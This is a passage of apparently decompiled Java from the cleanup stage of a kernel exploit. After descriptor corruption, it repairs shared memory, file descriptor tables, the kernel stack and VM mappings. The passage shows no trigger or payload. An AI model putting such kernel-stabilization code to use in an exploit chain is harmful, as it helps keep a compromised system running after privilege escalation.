        stabilizer.fixupSharedMemory(this.state.ofilesAddress, this.state.lookupDescriptor);
        DebugStatus.info("Analyzing corrupted file descriptors");
        this.state.usedDescriptors.remove((Object)new Integer(this.state.lookupDescriptor));
        final int fdFixes = stabilizer.fixUsedDescriptors(this.state.ofilesAddress, (Collection)this.state.usedDescriptors);
        if (fdFixes > 0) {
            DebugStatus.info(fdFixes + " descriptors were detected but not currently touched");
        }
        DebugStatus.info("Fixing up kernel stack");
        stabilizer.fixupKernelStack(this.state.threadAddress);
        DebugStatus.info("Checking vm space");
        final int numFixes = stabilizer.fixupVmSpace(this.state.processAddress, (Collection)this.state.mappedKernelStackAddresses);
        if (numFixes > 0) {
            DebugStatus.info("Fixed " + numFixes + " vm entries");
        }
    }
    
    static {
        KERNEL_STACK_SIZE = Param.ptoa(1L);
    }
}
